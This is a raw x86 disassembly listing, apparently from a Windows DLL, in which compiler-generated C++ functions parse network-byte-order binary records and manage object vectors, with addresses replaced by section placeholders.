mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10036960
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bff8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100369e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052d31
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x1c ] ebx
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x10 ]
test edx edx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] 0x0
test eax eax
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
xor ecx ecx
push ecx
push 0xf5
mov ecx eax
call sub_10035960
mov ecx eax
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
xor eax eax
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x30 ] 0xffffffff
test ecx ecx
jne r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov bl [ esi + 0x1 ]
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] 0x1
test eax eax
je r-xdata
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
lea eax [ edx - 0x1 ]
mov ecx ebx
push eax
push 0x1
push esi
call sub_10036c20
test eax eax
jne r-xdata
cmp [ ecx ] 0x1
jne r-xdata
push ecx
movzx ecx bl
push ecx
mov ecx eax
call sub_10035960
mov ecx eax
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] 0x2
test eax eax
je r-xdata
cmp eax 0x10
jb r-xdata
cmp [ ecx ] 0x2
jne r-xdata
push ecx
push 0xf6
mov ecx eax
call sub_10035960
mov ecx eax
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea esp [ esp ]
mov ecx [ eax + 0x1 ]
xor edi edi
mov [ esp + 0x20 ] ecx
mov eax 0x1
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edi
test ecx ecx
je r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10003630
mov ecx [ esp + 0x10 ]
mov eax [ eax + ecx ]
add ecx 0x4
add ecx eax
mov [ esp + 0x10 ] ecx
cmp ecx ebx
ja r-xdata
mov eax edi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x1c ]
push eax
push [ esp + 0x1c ]
push esi
call sub_10036c20
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esp + 0x14 ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax [ esp + 0x20 ]
jae r-xdata
mov edx [ ebx ]
mov ecx ebx
call [ edx + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
jmp r-xdata
mov eax ebx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test edi edi
je r-xdata
mov ebx [ esi + 0x10 ]
add eax 0x4
mov [ esp + 0x18 ] eax
cmp eax ebx
ja r-xdata
mov edi ebx
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
sub_10036c20
push ebp
mov ebp esp
push 0xffffffff
push sub_10052ebe
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0xac ] esi
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp [ esi + 0x4 ] ebx
mov edi 0x4
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmovne ebx edi
mov [ ebp - 0xa0 ] ecx
lea edi [ ebx + 0x1 ]
cmp ecx edi
ja r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push ecx
add eax edx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x2c ]
push eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0xa8 ] eax
cmp [ esi + 0x4 ] eax
je r-xdata
mov eax [ eax ]
xor ecx ecx
push ecx
push 0xf2
mov ecx eax
call sub_10035960
mov ecx eax
jmp r-xdata
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x2c ]
mov esi [ ebp - 0x2c ]
cmp edx 0x10
cmovae ecx esi
mov cl [ ecx + ebx ]
mov al cl
and al 0xf
mov [ ebp - 0xb1 ] al
test cl 0x20
je r-xdata
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
push ebx
cmovae eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_1003dc80
add esp 0xc
push [ ebp - 0xa8 ]
call [ ntohl@IAT ]
mov [ ebp - 0xa4 ] eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xac ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0xac ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov al [ ebp - 0xb1 ]
cmp al 0x1
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0xffffffff
push edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x44 ]
push 0x1
sub esp 0x18
mov ecx esp
mov [ ebp - 0xa8 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0x84 ]
mov ecx [ esi + 0xc ]
push edx
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x10 ]
mov esi eax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0x5c ]
push edi
push 0x0
push eax
lea ecx [ ebp - 0x2c ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x6
mov edx eax
push esi
lea ecx [ ebp - 0x9c ]
call sub_10037a20
add esp 0x4
mov esi eax
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp - 0x2c ]
cmp eax esi
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
cmp al 0x2
jne r-xdata
mov eax [ ebp - 0x1c ]
xor edi edi
sub eax ebx
cmp eax 0x2
jb r-xdata
mov [ ebp - 0xb0 ] r--data
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0x4 ] 0x8
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0xa0 ]
cmovae eax [ ebp - 0x2c ]
sub ecx ebx
push ecx
add eax ebx
lea ecx [ ebp - 0xb0 ]
push eax
call sub_1003b630
mov eax [ ebp - 0xa4 ]
cmp [ ebp - 0xac ] eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x88 ] 0x10
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
xor eax eax
push ecx
push 0xf8
mov ecx eax
call sub_10035960
jmp r-xdata
cmp al 0x8
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax ebx
cmp eax 0x5
jae r-xdata
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0xa
test eax eax
je r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
cmovae eax esi
movzx edi [ eax + ebx + 0x1 ]
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x2c ]
mov [ ebp - 0xb0 ] r--data
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x9c ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x48 ] 0x10
jb r-xdata
push [ ebp - 0x9c ]
call j_sub_1003f3e3#2
add esp 0x4
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_10005010
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi [ eax ]
mov esi [ esi + 0x4 ]
add esi eax
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp al 0x9
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax ebx
cmp eax 0x9
jae r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
push 0x1c
cmovae eax esi
movzx edi [ ebx + eax + 0x3 ]
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0xa0 ] esi
mov [ ebp - 0x4 ] 0xc
test esi esi
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0xb
push 0x1
push edi
push 0x1
mov ecx eax
call sub_10035ab0
jmp r-xdata
xor eax eax
push ecx
push 0xf7
mov ecx eax
call sub_10035960
jmp r-xdata
mov [ ebp - 0x48 ] 0xf
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x70 ] 0x10
jb r-xdata
push [ ebp - 0x5c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x18 ] 0xf
mov eax esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp al 0xa
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax ebx
cmp eax 0xd
jae r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
push 0x1c
cmovae eax esi
movzx eax [ edi + eax ]
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax esi
mov eax [ edi + eax + 0x2 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax esi
movzx esi [ edi + eax + 0x6 ]
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xac ] eax
mov [ ebp - 0x4 ] 0xe
test eax eax
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0xd
jmp r-xdata
push edi
call [ ntohs@IAT ]
movzx ecx ax
push ecx
push ecx
mov ecx esi
call sub_10035c90
jmp r-xdata
push ecx
push 0xf2
mov ecx eax
call sub_10035960
jmp r-xdata
mov esi [ eax ]
mov esi [ esi + 0x4 ]
add esi eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xb0 ] r--data
jmp r-xdata
xor esi esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xb0 ] r--data
jmp r-xdata
mov [ ebp - 0x4 ] 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x30 ] 0x10
jb r-xdata
push [ ebp - 0x84 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp al 0xb
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax ebx
cmp eax 0x5
jae r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
push 0x1c
cmovae eax esi
movzx eax [ edi + eax ]
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax esi
movzx eax [ edi + eax + 0x2 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax esi
mov ebx [ edi + eax + 0x4 ]
lea eax [ ebp - 0x2c ]
cmovae eax esi
mov esi [ edi + eax + 0x8 ]
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0x4 ] 0x10
test eax eax
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
mov edi [ ntohs@IAT ]
push esi
call edi
push [ ebp - 0xa0 ]
mov esi [ ntohl@IAT ]
movzx ebx ax
call esi
push [ ebp - 0xa4 ]
mov esi eax
call edi
movzx ecx ax
push ecx
push ebx
push esi
push ecx
mov ecx [ ebp - 0xac ]
call sub_10035e40
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x2c ]
mov [ ebp - 0x30 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x44 ] 0x0
push [ ebp - 0x44 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x1d
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax ebx
cmp eax 0x3
jae r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
cmovae eax esi
mov esi [ ntohs@IAT ]
movzx eax [ edi + eax ]
push eax
call esi
cmp [ ebp - 0x18 ] 0x10
movzx eax ax
mov [ ebp - 0xac ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
movzx eax [ edi + eax + 0x2 ]
add edi 0x4
push eax
call esi
mov esi [ ebp - 0x1c ]
sub esi ebx
movzx eax ax
sub esi 0x5
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x12
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xa0 ] eax
test eax eax
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x11
jmp r-xdata
push esi
mov esi [ ntohl@IAT ]
call esi
push ebx
mov [ ebp - 0xac ] eax
call esi
push [ ebp - 0xa0 ]
mov esi [ ntohs@IAT ]
mov ebx eax
call esi
push [ ebp - 0xa4 ]
movzx edi ax
call esi
movzx ecx ax
push ecx
push [ ebp - 0xac ]
push ebx
push edi
push ecx
mov ecx [ ebp - 0xa8 ]
call sub_100367a0
jmp r-xdata
push ecx
push 0xf6
mov ecx eax
call sub_10035960
jmp r-xdata
cmp edx 0x10
lea eax [ ebp - 0x2c ]
cmovae eax esi
movzx eax [ eax + edi ]
add edi 0x2
push eax
call [ ntohs@IAT ]
movzx esi ax
push 0x1c
mov [ ebp - 0xac ] esi
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x1b
test eax eax
je r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x1a
jmp r-xdata
push 0x20
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0xa0 ] esi
mov [ ebp - 0x4 ] 0x18
test esi esi
je r-xdata
jmp r-xdata
mov [ ebp - 0xa8 ] 0x0
push ecx
push esi
mov ecx eax
call sub_100277c0
mov [ ebp - 0xa8 ] eax
jmp r-xdata
xor eax eax
push 0x1
sub esp 0xc
lea eax [ ebp - 0x38 ]
mov ecx esp
mov [ ebp - 0xa4 ] esp
push eax
call sub_10037740
mov [ ebp - 0x4 ] 0x19
push [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x18
mov ecx esi
call sub_10036020
jmp r-xdata
cmp esi 0x12
jb r-xdata
mov eax [ ebp - 0xa8 ]
jmp r-xdata
mov ebx [ ntohl@IAT ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov esi [ ebp - 0x1c ]
sub esi ebx
mov [ ebp - 0xa4 ] 0x0
sub esi 0x3
cmp ax [ ebp - 0xac ]
jae r-xdata
mov esi [ eax ]
mov esi [ esi + 0x4 ]
add esi eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x38 ]
call sub_10036260
jmp r-xdata
xor esi esi
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x38 ]
call sub_10036260
jmp r-xdata
mov [ ebp - 0x4 ] 0x12
test eax eax
jne r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x13
test eax eax
je r-xdata
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x48 ] 0xf
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x4 ] 0x15
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
cmovae eax [ ebp - 0x2c ]
movzx eax [ eax + edi ]
push eax
call [ ntohs@IAT ]
cmp [ ebp - 0x18 ] 0x10
mov ebx [ ntohl@IAT ]
mov [ ebp - 0x6c ] ax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
mov eax [ eax + edi + 0x2 ]
push eax
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
mov eax [ eax + edi + 0x6 ]
push eax
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x64 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
mov eax [ eax + edi + 0xa ]
push eax
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x60 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
mov eax [ eax + edi + 0xe ]
add edi 0x12
push eax
call ebx
mov ebx eax
sub esi 0x12
cmp ebx esi
ja r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0xa8 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
movzx eax [ eax + edi ]
push eax
call [ ntohs@IAT ]
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x44 ] ax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push [ eax + edi + 0x2 ]
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push [ eax + edi + 0x6 ]
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push [ eax + edi + 0xa ]
call ebx
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
movzx eax [ eax + edi + 0xe ]
push eax
call [ ntohs@IAT ]
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x34 ] ax
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push [ eax + edi + 0x10 ]
call ebx
movdqu xmm0 [ ebp - 0x44 ]
mov ecx [ ebp - 0xa8 ]
add edi 0x14
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x84 ]
movdqu [ ebp - 0x84 ] xmm0
push eax
movq xmm0 [ ebp - 0x34 ]
lea ecx [ ecx + 0x8 ]
movq [ ebp - 0x74 ] xmm0
call sub_100279f0
mov eax [ ebp - 0xa4 ]
sub esi 0x14
inc eax
mov [ ebp - 0xa4 ] eax
cmp ax [ ebp - 0xac ]
jb r-xdata
push ecx
push 0xf2
mov ecx eax
call sub_10035960
jmp r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x16
test eax eax
je r-xdata
push ebx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x17
lea ecx [ ebp - 0x5c ]
push eax
call sub_10018bc0
mov [ ebp - 0x4 ] 0x15
lea ecx [ ebp - 0x84 ]
call sub_10001880
lea eax [ ebp - 0x6c ]
sub esi ebx
push eax
lea ecx [ ebp - 0x38 ]
add edi ebx
call sub_10037800
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0x6c ]
call sub_10001ef0
mov ecx [ ebp - 0xa4 ]
inc ecx
mov [ ebp - 0xa4 ] ecx
cmp ecx [ ebp - 0xa0 ]
jb r-xdata
push 0x10
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x1c
jmp r-xdata
mov eax [ ecx ]
push 0x1
mov eax [ eax + 0x4 ]
add ecx eax
mov eax [ ecx ]
call [ eax ]
cmp esi 0x14
jb r-xdata
xor eax eax
push ecx
push 0xf2
mov ecx eax
call sub_10035960
jmp r-xdata
mov esi [ eax ]
mov esi [ esi + 0x4 ]
add esi eax
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0x6c ]
call sub_10001ef0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x38 ]
call sub_10036260
jmp r-xdata
xor esi esi
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0x6c ]
call sub_10001ef0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x38 ]
call sub_10036260
jmp r-xdata
mov [ ebp - 0x4 ] 0x15
test eax eax
jne r-xdata
sub_10037740
push ebp
mov ebp esp
push 0xffffffff
push sub_10052ef0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
sub edx [ edi ]
mov eax 0x66666667
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
push eax
call sub_10036460
test al al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10036620
add esp 0xc
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
sub_10037800
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
push edi
push [ esi + 0x4 ]
call sub_100366c0
add [ esi + 0x4 ] 0x28
pop edi
pop esi
pop ebp
retn 0x4
push ecx
mov ecx esi
call sub_10037880
sub edi eax
mov eax 0x66666667
imul edi
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
lea ecx [ edi + edi * 4 ]
lea eax [ eax + ecx * 8 ]
push eax
push [ esi + 0x4 ]
call sub_100366c0
add [ esi + 0x4 ] 0x28
pop edi
pop esi
pop ebp
retn 0x4
push ecx
mov ecx esi
call sub_10037880
sub_10037880
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x66666667
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x66666667
imul esi
push ebx
sar edx 0x4
mov ebx 0x6666666
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x66666667
imul edi
inc esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_10037920
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_10037920
pop edi
pop esi
retn 0x4
sub_10037920
push ebp
mov ebp esp
push 0xffffffff
push sub_10052f10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10037ac0
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp + 0x8 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp edi 0x6666666
ja r-xdata
lea eax [ edi + edi * 4 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x8 ] eax
lea eax [ ecx + ecx * 4 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push ecx
mov edx [ ebx + 0x4 ]
mov ecx eax
call sub_10036530
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0xc
mov ecx [ ebp + 0x8 ]
call sub_1003c58d
lea eax [ edi + edi * 4 ]
shl eax 0x3
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10037a20
push ebp
mov ebp esp
push 0xffffffff
push sub_10052f49
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
mov eax [ edx + 0x14 ]
sub eax [ edx + 0x10 ]
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx edx
call sub_100050b0
push eax
mov ecx esi
call sub_10004f60
mov eax [ ecx + 0x14 ]
